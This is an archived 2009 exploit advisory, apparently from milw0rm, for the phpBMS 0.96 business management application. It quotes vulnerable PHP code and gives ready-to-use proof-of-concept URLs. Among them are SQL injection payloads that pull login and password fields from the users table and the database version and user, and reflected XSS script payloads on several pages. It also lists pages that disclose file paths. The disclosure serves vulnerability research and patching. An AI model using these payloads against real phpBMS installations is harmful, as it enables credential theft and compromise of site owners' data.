<html><head><title>phpBMS 0.96 Multiple Remote Vulnerabilities</title></head><pre>phpBMS v0.96
phpbms.org

eLwaux(c)2009, uasc.org.ua
http://phpbms.org/trial/


## ## ##
SQL Inj
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	$querystatement=&quot;SELECT
if(discounts.type+0=1,concat(discounts.value,\&quot;%\&quot;),discounts.value)
                  AS value FROM discounts WHERE id=&quot;.$_GET[&quot;id&quot;];
	$queryresult = $db-&gt;query($querystatement);
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PoC: /modules/bms/invoices_discount_ajax.php?id=-1+union+select+concat_ws(0x3a,version(),user(),database())



## ## ##
SQL Inj
\dbgraphic.php
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        $querystatement=&quot;SELECT &quot;.$_GET[&quot;f&quot;].&quot;,&quot;.$_GET[&quot;mf&quot;].&quot; FROM
&quot;.$_GET[&quot;t&quot;].&quot; WHERE id=&quot;.$_GET[&quot;r&quot;];
	$queryresult=$db-&gt;query($querystatement);
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PoC: \dbgraphic.php?f=concat_ws(id,login,password)&amp;mf=1&amp;t=users&amp;r=1


## ## ##
SQL Inj
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	if(isset($_GET[&quot;cmd&quot;])){
		switch($_GET[&quot;cmd&quot;]){
			case &quot;show&quot;:
				showSearch($_GET[&quot;tid&quot;],$_GET[&quot;base&quot;],$db);
			break;
		}//end switch
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PoC:
	/advancedsearch.php?cmd=show&amp;tid=-1+union+select+login+from+users&amp;base=2
	/advancedsearch.php?cmd=show&amp;tid=-1+union+select+password+from+users&amp;base=2


## ## ##
pXSS
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        &lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&lt;?php echo
$_SERVER[&quot;PHP_SELF&quot;]?&gt;&quot;&gt;
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
PoC:
     \index.php/&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;div id=&quot;
     \modules\base\myaccount.php/&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;div id=&quot;
     \phpbms\modules\base\modules_view.php&quot;&gt;&lt;script&gt;alert(/xss/);&lt;/script&gt;&lt;div
id=&quot;
     \phpbms\modules\base\tabledefs_options.php\&quot;&gt;{XSS}
     \phpbms\modules\base\adminsettings.php\&quot;&gt;{XSS}


## ## ##
Path Disclosure
     /footer.php
     /header.php
     /advancedsearch.php?cmd=show&amp;
     /choicelist.php

# milw0rm.com [2009-07-10]</pre></html>